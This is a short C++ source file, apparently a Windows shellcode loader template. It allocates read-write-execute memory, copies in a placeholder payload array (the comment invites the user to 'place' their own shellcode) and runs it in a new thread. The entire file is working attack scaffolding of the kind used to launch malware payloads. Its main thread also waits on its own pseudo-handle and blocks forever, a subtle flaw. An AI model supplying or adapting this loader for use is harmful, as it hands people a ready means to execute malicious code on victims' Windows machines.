// myexe.cpp
#include <windows.h>

char shellcode[] = "\x90\x90\x90\x90\x90";  //place with your shellcode

DWORD WINAPI ThreadProc(LPVOID lpParameter) {
    LPVOID allocatedMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (allocatedMemory == NULL) {
        return 1;
    }
    memcpy(allocatedMemory, shellcode, sizeof(shellcode));
    ((void(*)())allocatedMemory)();
    VirtualFree(allocatedMemory, 0, MEM_RELEASE);
    return 0;
}

int main() {
    CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
    WaitForSingleObject(GetCurrentThread(), INFINITE);
    return 0;
}